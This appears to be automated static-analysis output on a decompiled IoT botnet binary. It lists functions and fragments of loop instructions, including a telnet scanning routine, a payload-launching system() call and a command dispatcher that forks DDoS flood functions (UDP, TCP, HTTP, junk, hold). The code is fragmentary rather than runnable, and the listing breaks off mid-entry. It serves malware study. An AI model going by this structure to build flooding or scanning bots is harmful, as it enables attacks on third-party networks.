+++++++++ FUNCTION END 150839
+++++++++ FUNCTION LENGTH 573
+    while (true) {
+    while (true) {
+=================FUNCTION : abort ===================
+++++++++ FUNCTION START 141378
+++++++++ FUNCTION END 142061
+++++++++ FUNCTION LENGTH 683
+            sigprocmask();
+        sigprocmask();
+=================FUNCTION : __open_etc_hosts ===================
+++++++++ FUNCTION START 157920
+++++++++ FUNCTION END 158438
+++++++++ FUNCTION LENGTH 518
+    int32_t v503 = __GI_fopen((int32_t)&v502, (int32_t)&v501); // 0x41c32c
+        result = __GI_fopen((int32_t)&v504, (int32_t)&v501);
+=================FUNCTION : contains_string ===================
+++++++++ FUNCTION START 35735
+++++++++ FUNCTION END 36266
+++++++++ FUNCTION LENGTH 531
+    while (true) {
+        if (strcasestr((char *)a1, v507) != 0) {
+=================FUNCTION : __GI_strlen ===================
+++++++++ FUNCTION START 85785
+++++++++ FUNCTION END 86355
+++++++++ FUNCTION LENGTH 570
+    while (true) {
+    while (true) {
+=================FUNCTION : __libc_send ===================
+++++++++ FUNCTION START 100629
+++++++++ FUNCTION END 101145
+++++++++ FUNCTION LENGTH 516
+    int32_t v504 = send(sock, buf, length, flags); // 0x415650
+    if (flags != 0) {
+=================FUNCTION : matchPrompt ===================
+++++++++ FUNCTION START 16719
+++++++++ FUNCTION END 17283
+++++++++ FUNCTION LENGTH 564
+    while (true) {
+        while (true) {
+=================FUNCTION : __decode_dotted ===================
+++++++++ FUNCTION START 162667
+++++++++ FUNCTION END 163242
+++++++++ FUNCTION LENGTH 575
+    while (true) {
+=================FUNCTION : _charpad ===================
+++++++++ FUNCTION START 68256
+++++++++ FUNCTION END 68785
+++++++++ FUNCTION LENGTH 529
+    while (true) {
+=================FUNCTION : memcpy ===================
+++++++++ FUNCTION START 82722
+++++++++ FUNCTION END 83487
+++++++++ FUNCTION LENGTH 765
+        while (true) {
+=================FUNCTION : isatty ===================
+++++++++ FUNCTION START 91363
+++++++++ FUNCTION END 91869
+++++++++ FUNCTION LENGTH 506
+    return __GI_tcgetattr(&v504) == 0;
+=================FUNCTION : __GI_strcoll ===================
+++++++++ FUNCTION START 84732
+++++++++ FUNCTION END 85260
+++++++++ FUNCTION LENGTH 528
+    while (true) {
+=================FUNCTION : trim ===================
+++++++++ FUNCTION START 3698
+++++++++ FUNCTION END 4234
+++++++++ FUNCTION LENGTH 536
+    while (true) {
+=================FUNCTION : __GI_snprintf ===================
+++++++++ FUNCTION START 64071
+++++++++ FUNCTION END 64576
+++++++++ FUNCTION LENGTH 505
+    return __GI_vsnprintf((char *)&a1);
+=================FUNCTION : parseHex ===================
+++++++++ FUNCTION START 10075
+++++++++ FUNCTION END 10602
+++++++++ FUNCTION LENGTH 527
+    while (true) {
+=================FUNCTION : __encode_dotted ===================
+++++++++ FUNCTION START 162099
+++++++++ FUNCTION END 162664
+++++++++ FUNCTION LENGTH 565
+    while (true) {
+=================FUNCTION : __get_hosts_byname_r ===================
+++++++++ FUNCTION START 140867
+++++++++ FUNCTION END 141375
+++++++++ FUNCTION LENGTH 508
+    return __read_etc_hosts_r(0, a1, a2, 0, (int32_t *)a3, a4, a5, a6, a7, v505 + 0x4ffd0, v504);
+=================FUNCTION : tcpcsum ===================
+++++++++ FUNCTION START 31627
+++++++++ FUNCTION END 32139
+++++++++ FUNCTION LENGTH 512
+    free();
+=================FUNCTION : sprintf ===================
+++++++++ FUNCTION START 64579
+++++++++ FUNCTION END 65085
+++++++++ FUNCTION LENGTH 506
+    return __GI_vsnprintf((char *)-1);
+=================FUNCTION : inet_ntoa_r ===================
+++++++++ FUNCTION START 95503
+++++++++ FUNCTION END 96029
+++++++++ FUNCTION LENGTH 526
+    while (true) {
+=================FUNCTION : sigprocmask ===================
+++++++++ FUNCTION START 59942
+++++++++ FUNCTION END 60470
+++++++++ FUNCTION LENGTH 528
+    int32_t v506 = sigprocmask(); // 0x412718
+=================FUNCTION : _ppfs_setargs ===================
+++++++++ FUNCTION START 79112
+++++++++ FUNCTION END 79760
+++++++++ FUNCTION LENGTH 648
+        while (true) {
+=================FUNCTION : kill ===================
+++++++++ FUNCTION START 56307
+++++++++ FUNCTION END 56824
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = kill(); // 0x412420
+=================FUNCTION : __heap_alloc ===================
+++++++++ FUNCTION START 107038
+++++++++ FUNCTION END 107595
+++++++++ FUNCTION LENGTH 557
+    while (true) {
+=================FUNCTION : __GI_strcasecmp ===================
+++++++++ FUNCTION START 161557
+++++++++ FUNCTION END 162096
+++++++++ FUNCTION LENGTH 539
+    while (true) {
+=================FUNCTION : getdtablesize ===================
+++++++++ FUNCTION START 53709
+++++++++ FUNCTION END 54224
+++++++++ FUNCTION LENGTH 515
+    if (getrlimit() >= 0) {
+=================FUNCTION : getegid ===================
+++++++++ FUNCTION START 124063
+++++++++ FUNCTION END 124580
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = getegid(); // 0x417810
+=================FUNCTION : get_telstate_host ===================
+++++++++ FUNCTION START 33163
+++++++++ FUNCTION END 33670
+++++++++ FUNCTION LENGTH 507
+    return __GI_inet_ntoa(v504);
+=================FUNCTION : __vfork ===================
+++++++++ FUNCTION START 60993
+++++++++ FUNCTION END 61499
+++++++++ FUNCTION LENGTH 506
+    return __libc_fork();
+=================FUNCTION : getHost ===================
+++++++++ FUNCTION START 11272
+++++++++ FUNCTION END 11779
+++++++++ FUNCTION LENGTH 507
+    *a2 = inet_addr(a1);
+=================FUNCTION : __libc_getpid ===================
+++++++++ FUNCTION START 54747
+++++++++ FUNCTION END 55264
+++++++++ FUNCTION LENGTH 517
+    int32_t pid = getpid(); // 0x4122f0
+=================FUNCTION : geteuid ===================
+++++++++ FUNCTION START 54227
+++++++++ FUNCTION END 54744
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = geteuid(); // 0x412290
+=================FUNCTION : getrlimit ===================
+++++++++ FUNCTION START 55267
+++++++++ FUNCTION END 55784
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = getrlimit(); // 0x412350
+=================FUNCTION : __GI_setsockopt ===================
+++++++++ FUNCTION START 101667
+++++++++ FUNCTION END 102183
+++++++++ FUNCTION LENGTH 516
+    int32_t v504 = setsockopt(sock, level, option_name, option_value, 0); // 0x415748
+=================FUNCTION : rand ===================
+++++++++ FUNCTION START 109259
+++++++++ FUNCTION END 109765
+++++++++ FUNCTION LENGTH 506
+    return random();
+=================FUNCTION : _promoted_size ===================
+++++++++ FUNCTION START 79763
+++++++++ FUNCTION END 80290
+++++++++ FUNCTION LENGTH 527
+    while (true) {
+=================FUNCTION : fgets ===================
+++++++++ FUNCTION START 147997
+++++++++ FUNCTION END 148519
+++++++++ FUNCTION LENGTH 522
+    int32_t result = __GI_fgets_unlocked((char *)a1, a2, a3); // 0x41adb8
+=================FUNCTION : __GI_inet_ntoa ===================
+++++++++ FUNCTION START 96032
+++++++++ FUNCTION END 96538
+++++++++ FUNCTION LENGTH 506
+    return inet_ntoa_r((int32_t)&v503);
+=================FUNCTION : makeIPPacket ===================
+++++++++ FUNCTION START 32142
+++++++++ FUNCTION END 32650
+++++++++ FUNCTION LENGTH 508
+    rand_cmwc();
+=================FUNCTION : inet_pton4 ===================
+++++++++ FUNCTION START 152512
+++++++++ FUNCTION END 153099
+++++++++ FUNCTION LENGTH 587
+    while (true) {
+=================FUNCTION : __libc_close ===================
+++++++++ FUNCTION START 52149
+++++++++ FUNCTION END 52666
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = close(fd); // 0x412120
+=================FUNCTION : __GI_vsnprintf ===================
+++++++++ FUNCTION START 65088
+++++++++ FUNCTION END 65607
+++++++++ FUNCTION LENGTH 519
+    int32_t result = _vfprintf_internal(); // 0x412a98
+=================FUNCTION : prints ===================
+++++++++ FUNCTION START 4751
+++++++++ FUNCTION END 5363
+++++++++ FUNCTION LENGTH 612
+        while (true) {
+=================FUNCTION : fflush_unlocked ===================
+++++++++ FUNCTION START 149090
+++++++++ FUNCTION END 149689
+++++++++ FUNCTION LENGTH 599
+        while (true) {
+=================FUNCTION : __libc_waitpid ===================
+++++++++ FUNCTION START 61502
+++++++++ FUNCTION END 62008
+++++++++ FUNCTION LENGTH 506
+    return wait4();
+=================FUNCTION : HackerScan ===================
+++++++++ FUNCTION START 30565
+++++++++ FUNCTION END 31072
+++++++++ FUNCTION LENGTH 507
+    return rand_cmwc() & -1 - a1 ^ v504 & a1;
+=================FUNCTION : inet_ntop4 ===================
+++++++++ FUNCTION START 153896
+++++++++ FUNCTION END 154451
+++++++++ FUNCTION LENGTH 555
+    while (true) {
+=================FUNCTION : __stdio_WRITE ===================
+++++++++ FUNCTION START 129882
+++++++++ FUNCTION END 130463
+++++++++ FUNCTION LENGTH 581
+        while (true) {
+=================FUNCTION : free ===================
+++++++++ FUNCTION START 106458
+++++++++ FUNCTION END 107035
+++++++++ FUNCTION LENGTH 577
+    int32_t v508 = __heap_free((int32_t *)v506, v504 - 4, v507); // 0x415c74
+=================FUNCTION : socket ===================
+++++++++ FUNCTION START 102186
+++++++++ FUNCTION END 102703
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = socket(); // 0x4157b0
+=================FUNCTION : fdgets ===================
+++++++++ FUNCTION START 9539
+++++++++ FUNCTION END 10072
+++++++++ FUNCTION LENGTH 533
+    while (true) {
+=================FUNCTION : __GI_fopen ===================
+++++++++ FUNCTION START 144173
+++++++++ FUNCTION END 144679
+++++++++ FUNCTION LENGTH 506
+    return _stdio_fopen(0, (char *)-1);
+=================FUNCTION : __GI_getsockname ===================
+++++++++ FUNCTION START 99070
+++++++++ FUNCTION END 99587
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = getsockname(sock, addr, (int32_t *)addr_len); // 0x415510
+=================FUNCTION : __libc_fork ===================
+++++++++ FUNCTION START 53189
+++++++++ FUNCTION END 53706
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = fork(); // 0x4121e0
+=================FUNCTION : __libc_open ===================
+++++++++ FUNCTION START 56827
+++++++++ FUNCTION END 57349
+++++++++ FUNCTION LENGTH 522
+    int32_t fd = open(path, oflag); // 0x4124a4
+=================FUNCTION : _stdio_fopen ===================
+++++++++ FUNCTION START 146812
+++++++++ FUNCTION END 147477
+++++++++ FUNCTION LENGTH 665
+                                free();
+=================FUNCTION : inet_addr ===================
+++++++++ FUNCTION START 96541
+++++++++ FUNCTION END 97054
+++++++++ FUNCTION LENGTH 513
+    if (inet_aton((char *)&result) != 0) {
+=================FUNCTION : wait4 ===================
+++++++++ FUNCTION START 126703
+++++++++ FUNCTION END 127220
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = wait4(); // 0x417a20
+=================FUNCTION : strcasestr ===================
+++++++++ FUNCTION START 90311
+++++++++ FUNCTION END 90851
+++++++++ FUNCTION LENGTH 540
+    while (true) {
+=================FUNCTION : __libc_creat ===================
+++++++++ FUNCTION START 57352
+++++++++ FUNCTION END 57858
+++++++++ FUNCTION LENGTH 506
+    return __libc_open((char *)769, 769);
+=================FUNCTION : __check_one_fd ===================
+++++++++ FUNCTION START 120078
+++++++++ FUNCTION END 120599
+++++++++ FUNCTION LENGTH 521
+    int32_t v504 = __libc_open((char *)&v503, a2); // 0x4171c4
+=================FUNCTION : __GI_wcsnrtombs ===================
+++++++++ FUNCTION START 128762
+++++++++ FUNCTION END 129371
+++++++++ FUNCTION LENGTH 609
+        while (true) {
+=================FUNCTION : fprintf ===================
+++++++++ FUNCTION START 129374
+++++++++ FUNCTION END 129879
+++++++++ FUNCTION LENGTH 505
+    return __GI_vfprintf((int16_t *)&a1);
+=================FUNCTION : random ===================
+++++++++ FUNCTION START 109768
+++++++++ FUNCTION END 110281
+++++++++ FUNCTION LENGTH 513
+    __GI_random_r(&v505, (int32_t)&result);
+=================FUNCTION : getsockopt ===================
+++++++++ FUNCTION START 99590
+++++++++ FUNCTION END 100107
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = getsockopt(); // 0x415588
+=================FUNCTION : __libc_connect ===================
+++++++++ FUNCTION START 98550
+++++++++ FUNCTION END 99067
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = connect(sock, addr, addr_len); // 0x4154b0
+=================FUNCTION : LoopPayload ===================
+++++++++ FUNCTION START 37571
+++++++++ FUNCTION END 38078
+++++++++ FUNCTION LENGTH 507
+    __libc_system(*(int32_t *)&v503 - 0x1b88);
+=================FUNCTION : sclose ===================
+++++++++ FUNCTION START 32653
+++++++++ FUNCTION END 33160
+++++++++ FUNCTION LENGTH 507
+    __libc_close(a1);
+=================FUNCTION : srand ===================
+++++++++ FUNCTION START 111314
+++++++++ FUNCTION END 111825
+++++++++ FUNCTION LENGTH 511
+    srandom_r((int64_t)a1, (int32_t)&v505);
+=================FUNCTION : getuid ===================
+++++++++ FUNCTION START 125103
+++++++++ FUNCTION END 125620
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = getuid(); // 0x4178d0
+=================FUNCTION : getgid ===================
+++++++++ FUNCTION START 124583
+++++++++ FUNCTION END 125100
+++++++++ FUNCTION LENGTH 517
+    int32_t v504 = getgid(); // 0x417870
+=================FUNCTION : __GI_strspn ===================
+++++++++ FUNCTION START 151437
+++++++++ FUNCTION END 151991
+++++++++ FUNCTION LENGTH 554
+    while (true) {
+=================FUNCTION : malloc ===================
+++++++++ FUNCTION START 105864
+++++++++ FUNCTION END 106455
+++++++++ FUNCTION LENGTH 591
+            __heap_free((int32_t *)v514, v513, v509);
+=================FUNCTION : __GI_gethostbyname ===================
+++++++++ FUNCTION START 97057
+++++++++ FUNCTION END 97565
+++++++++ FUNCTION LENGTH 508
+    gethostbyname_r(a1, &v504, (int32_t)&v503, 460, (int32_t)&result, v502);
+================================================================================
+========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
+================================================================================
+=============================WHILE LOOPS ID : 5 @ print ====================================
+++++++++ WHILE START : 6477 
+++++++++ WHILE FUNCTION : print 
+++++++++ WHILE END : 6660 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 6 @ fdpclose ====================================
+++++++++ WHILE START : 9463 
+++++++++ WHILE FUNCTION : fdpclose 
+++++++++ WHILE END : 9487 
+++++++++ INTRESTING INSTRUCTIONS :  
+		int32_t v509 = __libc_waitpid(v507, (int32_t)&v505, 0); // 0x401b50
+		sigprocmask();
+=============================WHILE LOOPS ID : 7 @ fdpclose ====================================
+++++++++ WHILE START : 9500 
+++++++++ WHILE FUNCTION : fdpclose 
+++++++++ WHILE END : 9511 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (__libc_waitpid(v507, (int32_t)&v505, 0) == -1) {
+		sigprocmask();
+=============================WHILE LOOPS ID : 8 @ fdpclose ====================================
+++++++++ WHILE START : 9524 
+++++++++ WHILE FUNCTION : fdpclose 
+++++++++ WHILE END : 9535 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (__libc_waitpid(v507, (int32_t)&v505, 0) == -1) {
+		sigprocmask();
+=============================WHILE LOOPS ID : 11 @ getBogos ====================================
+++++++++ WHILE START : 12815 
+++++++++ WHILE FUNCTION : getBogos 
+++++++++ WHILE END : 12852 
+++++++++ INTRESTING INSTRUCTIONS :  
+		uppercase((char *)&v505);
+		if (strstr(v506, (char *)(*(int32_t *)&v503 - 0x29b0)) == v506) {
+		while (true) {
+		if (fdgets(v506, 0x1000, v504) == 0) {
+=============================WHILE LOOPS ID : 13 @ recvLine ====================================
+++++++++ WHILE START : 14471 
+++++++++ WHILE FUNCTION : recvLine 
+++++++++ WHILE END : 14536 
+++++++++ INTRESTING INSTRUCTIONS :  
+		HackerPrint(*(int32_t *)&v512, *(int32_t *)&v511 - 0x29a4);
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 15 @ connectTimeout ====================================
+++++++++ WHILE START : 15607 
+++++++++ WHILE FUNCTION : connectTimeout 
+++++++++ WHILE END : 15625 
+++++++++ INTRESTING INSTRUCTIONS :  
+		getsockopt();
+=============================WHILE LOOPS ID : 17 @ matchPrompt ====================================
+++++++++ WHILE START : 17227 
+++++++++ WHILE FUNCTION : matchPrompt 
+++++++++ WHILE END : 17282 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 18 @ readUntil ====================================
+++++++++ WHILE START : 17794 
+++++++++ WHILE FUNCTION : readUntil 
+++++++++ WHILE END : 17881 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		int32_t v513 = __libc_recv(a1, (int32_t *)v512, 1, 0, v512) + a8; // 0x4037f4
+		int32_t v516 = __libc_recv(a1, (int32_t *)(v512 + 1), 2, 0, v513) + v513; // 0x403880
+		if (strstr(a6, (char *)a2) == 0) {
+=============================WHILE LOOPS ID : 19 @ read_with_timeout ====================================
+++++++++ WHILE START : 34701 
+++++++++ WHILE FUNCTION : read_with_timeout 
+++++++++ WHILE END : 34713 
+++++++++ INTRESTING INSTRUCTIONS :  
+		return __libc_recv(a1, (int32_t *)a3, a4, 0, (int32_t)&v511);
+=============================WHILE LOOPS ID : 20 @ contains_string ====================================
+++++++++ WHILE START : 36249 
+++++++++ WHILE FUNCTION : contains_string 
+++++++++ WHILE END : 36263 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (strcasestr((char *)a1, v507) != 0) {
+=============================WHILE LOOPS ID : 21 @ StartTheLelz ====================================
+++++++++ WHILE START : 36794 
+++++++++ WHILE FUNCTION : StartTheLelz 
+++++++++ WHILE END : 37046 
+++++++++ INTRESTING INSTRUCTIONS :  
+		socket();
+		if (__libc_connect(*v523, (struct sockaddr *)&v503, 16) == -1) {
+		sclose(*v523);
+		while (true) {
+		sclose(*v523);
+		if (__libc_send(*v523, (int32_t *)v533, v532, 0x4000) <= 0xffffffff) {
+		if (__libc_send(*v523, (int32_t *)(v535 - 0x1d78), 2, 0x4000) <= 0xffffffff) {
+		if (__libc_send(*v523, (int32_t *)v537, v536, 0x4000) <= 0xffffffff) {
+		if (__libc_send(*v523, (int32_t *)(v538 - 0x1d78), 2, 0x4000) <= 0xffffffff) {
+		get_telstate_host(v510);
+		HackerPrint(*(int32_t *)&v539, *(int32_t *)&v534 - 0x1d74);
+		get_telstate_host(v510);
+		HackerPrint(*(int32_t *)&v539, *(int32_t *)&v534 - 0x1d08);
+		if (__libc_send(*v523, (int32_t *)v544, v542, 0x4000) <= 0xffffffff) {
+		sclose(*v523);
+=============================WHILE LOOPS ID : 22 @ sendHTTP ====================================
+++++++++ WHILE START : 40165 
+++++++++ WHILE FUNCTION : sendHTTP 
+++++++++ WHILE END : 40202 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		int32_t v511 = socket_connect(a1, a3); // 0x40becc
+		__libc_close(v512);
+=============================WHILE LOOPS ID : 23 @ sendTCP ====================================
+++++++++ WHILE START : 42436 
+++++++++ WHILE FUNCTION : sendTCP 
+++++++++ WHILE END : 42482 
+++++++++ INTRESTING INSTRUCTIONS :  
+		HackerPrint(*(int32_t *)&v499, (int32_t)&v519);
+=============================WHILE LOOPS ID : 24 @ sendJUNK ====================================
+++++++++ WHILE START : 43053 
+++++++++ WHILE FUNCTION : sendJUNK 
+++++++++ WHILE END : 43186 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		if (__libc_send(*v529, v511, 1024, 0x4000) != -1) {
+		__libc_close(*v529);
+		if (__libc_connect(*v532, (struct sockaddr *)&v506, 16) == -1) {
+		__libc_close(*v532);
+		__libc_close(*v532);
+=============================WHILE LOOPS ID : 25 @ sendHOLD ====================================
+++++++++ WHILE START : 43715 
+++++++++ WHILE FUNCTION : sendHOLD 
+++++++++ WHILE END : 43842 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		__libc_close(*v528);
+		if (__libc_connect(*v532, (struct sockaddr *)&v506, 16) == -1) {
+		__libc_close(*v532);
+		__libc_close(*v532);
+=============================WHILE LOOPS ID : 26 @ processCmd ====================================
+++++++++ WHILE START : 44562 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 44578 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() == 0) {
+		sendHOLD(v602, v529, v530);
+=============================WHILE LOOPS ID : 27 @ processCmd ====================================
+++++++++ WHILE START : 44624 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 44641 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() == 0) {
+		sendJUNK(v605, v532, v533);
+		__libc_close(*(int32_t *)&v483);
+=============================WHILE LOOPS ID : 28 @ processCmd ====================================
+++++++++ WHILE START : 44712 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 44728 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() == 0) {
+		sendUDP(v609, v536, v537, v538, v539, 10);
+=============================WHILE LOOPS ID : 29 @ processCmd ====================================
+++++++++ WHILE START : 44784 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 44802 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() == 0) {
+		sendHTTP(*v517, v541, (int16_t)(v543 % 0x10000), v544, v546, v548);
+=============================WHILE LOOPS ID : 30 @ processCmd ====================================
+++++++++ WHILE START : 44852 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 44869 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() == 0) {
+		sendCNC(v611, v558, v559);
+		__libc_close(*(int32_t *)&v483);
+=============================WHILE LOOPS ID : 31 @ processCmd ====================================
+++++++++ WHILE START : 44917 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 44936 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() == 0) {
+		sendJUNK(v504, v561, v562);
+		sendSTD(v504, v561, v562);
+		sendHOLD(v504, v561, v562);
+		__libc_close(*(int32_t *)&v483);
+=============================WHILE LOOPS ID : 32 @ processCmd ====================================
+++++++++ WHILE START : 44987 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45003 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() == 0) {
+		sendSTD(v614, v564, v565);
+=============================WHILE LOOPS ID : 33 @ processCmd ====================================
+++++++++ WHILE START : 45092 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45108 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() == 0) {
+		sendTCP(v616, v508, v569, v570, v571, 0, 10);
+=============================WHILE LOOPS ID : 34 @ processCmd ====================================
+++++++++ WHILE START : 45152 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45181 
+++++++++ INTRESTING INSTRUCTIONS :  
+		kill();
+=============================WHILE LOOPS ID : 35 @ processCmd ====================================
+++++++++ WHILE START : 45225 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45234 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendHOLD(v575, v529, v530);
+=============================WHILE LOOPS ID : 36 @ processCmd ====================================
+++++++++ WHILE START : 45262 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45272 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendJUNK(v576, v532, v533);
+		__libc_close(*(int32_t *)&v483);
+=============================WHILE LOOPS ID : 37 @ processCmd ====================================
+++++++++ WHILE START : 45325 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45334 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendUDP(v577, v536, v537, v538, v539, 10);
+=============================WHILE LOOPS ID : 38 @ processCmd ====================================
+++++++++ WHILE START : 45371 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45381 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendCNC(v578, v558, v559);
+		__libc_close(*(int32_t *)&v483);
+=============================WHILE LOOPS ID : 39 @ processCmd ====================================
+++++++++ WHILE START : 45419 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45431 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendJUNK(v504, v561, v562);
+		sendSTD(v504, v561, v562);
+		sendHOLD(v504, v561, v562);
+		__libc_close(*(int32_t *)&v483);
+=============================WHILE LOOPS ID : 40 @ processCmd ====================================
+++++++++ WHILE START : 45471 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45480 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendSTD(v579, v564, v565);
+=============================WHILE LOOPS ID : 41 @ processCmd ====================================
+++++++++ WHILE START : 45560 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45569 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendTCP(v584, v508, v569, v570, v571, 0, 10);
+=============================WHILE LOOPS ID : 43 @ processCmd ====================================
+++++++++ WHILE START : 45633 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45645 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendHTTP(*v517, v541, (int16_t)(v543 % 0x10000), v544, v546, v548);
+=============================WHILE LOOPS ID : 44 @ processCmd ====================================
+++++++++ WHILE START : 45700 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45709 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendHOLD(v575, v529, v530);
+=============================WHILE LOOPS ID : 45 @ processCmd ====================================
+++++++++ WHILE START : 45737 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45747 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendJUNK(v576, v532, v533);
+		__libc_close(*(int32_t *)&v483);
+=============================WHILE LOOPS ID : 46 @ processCmd ====================================
+++++++++ WHILE START : 45800 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45809 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendUDP(v577, v536, v537, v538, v539, 10);
+=============================WHILE LOOPS ID : 47 @ processCmd ====================================
+++++++++ WHILE START : 45836 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45848 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendHTTP(*v517, v541, (int16_t)(v543 % 0x10000), v544, v546, v548);
+=============================WHILE LOOPS ID : 48 @ processCmd ====================================
+++++++++ WHILE START : 45878 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45888 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendCNC(v578, v558, v559);
+		__libc_close(*(int32_t *)&v483);
+=============================WHILE LOOPS ID : 49 @ processCmd ====================================
+++++++++ WHILE START : 45916 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45928 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendJUNK(v504, v561, v562);
+		sendSTD(v504, v561, v562);
+		sendHOLD(v504, v561, v562);
+		__libc_close(*(int32_t *)&v483);
+=============================WHILE LOOPS ID : 50 @ processCmd ====================================
+++++++++ WHILE START : 45958 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 45967 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendSTD(v579, v564, v565);
+=============================WHILE LOOPS ID : 51 @ processCmd ====================================
+++++++++ WHILE START : 46035 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 46044 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendTCP(v584, v508, v569, v570, v571, 0, 10);
+=============================WHILE LOOPS ID : 53 @ processCmd ====================================
+++++++++ WHILE START : 46116 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 46125 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendHOLD(v575, v529, v530);
+=============================WHILE LOOPS ID : 54 @ processCmd ====================================
+++++++++ WHILE START : 46153 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 46163 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendJUNK(v576, v532, v533);
+		__libc_close(*(int32_t *)&v483);
+=============================WHILE LOOPS ID : 55 @ processCmd ====================================
+++++++++ WHILE START : 46216 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 46225 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendUDP(v577, v536, v537, v538, v539, 10);
+=============================WHILE LOOPS ID : 56 @ processCmd ====================================
+++++++++ WHILE START : 46252 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 46264 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendHTTP(*v517, v541, (int16_t)(v543 % 0x10000), v544, v546, v548);
+=============================WHILE LOOPS ID : 57 @ processCmd ====================================
+++++++++ WHILE START : 46294 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 46304 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendCNC(v578, v558, v559);
+		__libc_close(*(int32_t *)&v483);
+=============================WHILE LOOPS ID : 58 @ processCmd ====================================
+++++++++ WHILE START : 46332 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 46344 
+++++++++ INTRESTING INSTRUCTIONS :  
